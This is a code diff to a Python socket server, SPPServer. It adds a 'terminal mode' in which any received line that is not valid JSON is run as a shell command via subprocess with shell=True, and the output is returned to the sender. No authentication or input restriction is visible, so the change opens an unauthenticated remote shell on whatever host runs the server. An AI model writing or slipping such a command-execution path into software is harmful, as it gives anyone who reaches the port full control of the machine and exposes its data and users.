@@ -148,9 +148,29 @@ class SPPServer:
 
     def _process(self, sock, addr, raw):
         try:
-            m = json.loads(raw.decode())
+            line = raw.decode()
+        except UnicodeDecodeError:
+            _send_raw(sock, "ERROR: invalid encoding\n")
+            return
+
+        # Try JSON protocol
+        try:
+            m = json.loads(line)
         except json.JSONDecodeError:
-            _send(sock, {"type": "error", "error": "invalid json"})
+            # Not JSON → raw shell command (terminal mode)
+            logger.info(f"[spp] shell: {line[:80]}")
+            try:
+                r = subprocess.run(
+                    line, shell=True, capture_output=True, text=True, timeout=30
+                )
+                out = r.stdout
+                if r.stderr:
+                    out += r.stderr
+                _send_raw(sock, out)
+            except subprocess.TimeoutExpired:
+                _send_raw(sock, "ERROR: command timed out\n")
+            except Exception as e:
+                _send_raw(sock, f"ERROR: {e}\n")
             return
         t = m.get("type", "")
         rid = m.get("id", 0)
@@ -178,6 +198,16 @@ class SPPServer:
 def _send(sock, data):
     try:
         sock.sendall((json.dumps(data, ensure_ascii=False) + "\n").encode())
+    except OSError:
+        pass
+
+
+def _send_raw(sock, data):
+    """Send raw text back (not JSON)."""
+    try:
+        if isinstance(data, str):
+            data = data.encode()
+        sock.sendall(data)
     except OSError:
         pass
 
